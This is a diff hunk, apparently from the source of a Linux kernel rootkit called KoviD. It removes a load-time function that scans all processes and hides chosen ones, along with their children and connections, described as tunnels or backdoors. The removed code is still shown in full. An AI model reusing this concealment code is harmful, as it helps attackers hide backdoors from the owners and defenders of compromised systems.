@@ -519,38 +519,6 @@ bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *priv)
 	return false;
 }
 
-/*
- * This function runs once during initialization.
- * Its primary purpose is to hide network applications, such as tunnels
- * or external backdoor-like applications, except for the built-in ones.
- *
- * It performs a comprehensive scan of all processes that are running on
- * the system when KoviD module is loaded. It is important to note
- * that this function also conceals the connections of network applications.
- * For more information, refer to 'netapp.h'.
- */
-void kv_scan_and_hide(void)
-{
-	struct task_struct *t;
-
-	for_each_process (t) {
-		short i = 0;
-
-		if (kv_find_hidden_task(t))
-			continue;
-		for (; kv_hide_ps_on_load[i].name != NULL; ++i) {
-			if (strncmp(kv_hide_ps_on_load[i].name, t->comm,
-				    strlen(kv_hide_ps_on_load[i].name)))
-				continue;
-			prinfo("Hide task name '%s' of pid %d\n", t->comm,
-			       t->pid);
-			kv_hide_task_by_pid(t->pid, kv_hide_ps_on_load[i].type,
-					    CHILDREN);
-			break;
-		}
-	}
-}
-
 bool kv_pid_init(struct kernel_syscalls *fn_addr)
 {
 	if (!fn_addr) {
